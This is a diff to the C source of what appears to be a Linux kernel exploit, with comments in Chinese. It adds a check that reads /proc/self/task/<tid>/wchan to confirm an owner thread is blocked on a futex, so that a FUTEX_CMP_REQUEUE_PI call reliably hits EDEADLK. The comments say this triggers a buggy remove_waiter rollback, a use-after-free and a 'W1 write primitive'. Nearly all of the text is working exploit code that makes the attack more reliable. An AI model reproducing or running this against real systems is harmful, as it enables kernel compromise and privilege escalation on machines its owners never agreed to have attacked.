@@ -28,6 +28,7 @@ atomic_int owner_started;
 atomic_int owner_chain_done;
 atomic_int route_done;
 atomic_int waiter_tid;
+atomic_int owner_tid;
 atomic_int punch_consume_go;
 atomic_int punch_consume_stop;
 atomic_int consumer_calls;
@@ -79,6 +80,9 @@ void *waiter_thread(void *arg __attribute__((unused))) {
 
 void *owner_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
+
+  int tid = (int)syscall(SYS_gettid);
+  atomic_store(&owner_tid, tid);
 
   long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   if (lock_target != 0) {
@@ -193,6 +197,7 @@ void reset_main_route_state(void) {
   atomic_store(&owner_chain_done, 0);
   atomic_store(&route_done, 0);
   atomic_store(&waiter_tid, 0);
+  atomic_store(&owner_tid, 0);
   atomic_store(&punch_consume_go, 0);
   atomic_store(&punch_consume_stop, 0);
   atomic_store(&consumer_calls, 0);
@@ -202,6 +207,27 @@ void reset_main_route_state(void) {
   atomic_store(&pipe_prepare_done, 0);
   cfi_last_step = 0;
   cfi_last_errno = 0;
+}
+
+/* 【查岗】读 /proc/self/task/<tid>/wchan, 确认 owner 线程确实睡死在
+ * futex 上。只有它卡死在 pi_chain, 死锁环(owner->chain->waiter->target
+ * ->owner)才闭合, FUTEX_CMP_REQUEUE_PI 才会撞见死锁走进 buggy
+ * remove_waiter 回滚(EDEADLK)并留下鬼标签(UAF)。 */
+static int owner_wchan_is_futex(int tid) {
+  char path[64];
+  char buf[128];
+  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
+  int fd = open(path, O_RDONLY);
+  if (fd < 0) {
+    return 0;
+  }
+  ssize_t n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0) {
+    return 0;
+  }
+  buf[n] = 0;
+  return strstr(buf, "futex") != NULL;
 }
 
 /* 【开场编排】等三位小朋友就位后，喊一声"换玩具！"(FUTEX_CMP_REQUEUE_PI)。
@@ -221,9 +247,36 @@ void run_main_route_threads(void) {
     usleep(1000);
   }
 
-  usleep(100000);
+  /* EDEADLK 必须发生在 requeue 的链遍历内部, 所以 owner 必须先卡死在
+   * pi_chain 上。用 wchan 查岗, 最多等 500ms。 */
+  int otid = atomic_load(&owner_tid);
+  int blocked = 0;
+  for (int i = 0; i < 100 && !blocked; i++) {
+    blocked = owner_wchan_is_futex(otid);
+    if (!blocked) {
+      usleep(5000);
+    }
+  }
+  pr_info("main owner_blocked_on_futex=%d tid=%d\n", blocked, otid);
+  if (!blocked) {
+    usleep(50000);
+  }
+  /* wchan=futex 只说明 owner 睡下了, owner->pi_blocked_on 指向 chain
+   * waiter 的 PI 依赖还需一点时间建立。立刻 requeue 会撞上空窗返 0。
+   * 再等 20ms 让环完全闭合。 */
+  usleep(20000);
+
   errno = 0;
-  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
+  long req = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                      &f_pi_target, 0);
+  pr_info("main FUTEX_CMP_REQUEUE_PI ret=%ld errno=%d "
+          "(need ret=-1 errno=35: buggy remove_waiter rollback only runs "
+          "on EDEADLK)\n",
+          req, errno);
+  if (req >= 0) {
+    pr_warning("main requeue returned success (no EDEADLK): PI cycle not "
+               "armed, W1 write primitive will NOT fire this attempt\n");
+  }
 
   while (!atomic_load(&route_done)) {
     if (atomic_exchange(&pipe_prepare_request, 0)) {
